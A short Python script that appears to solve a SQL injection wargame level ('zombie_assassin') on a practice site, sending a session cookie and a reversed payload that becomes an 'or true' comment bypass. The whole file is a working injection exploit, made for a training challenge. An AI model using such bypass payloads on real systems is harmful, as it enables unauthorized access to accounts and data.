import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"
cookies = {'PHPSESSID': session_id}

payload = '?id="&pw=%23 eurt ro'
url += payload

response = requests.get(url, cookies=cookies)
print_html(response.text)
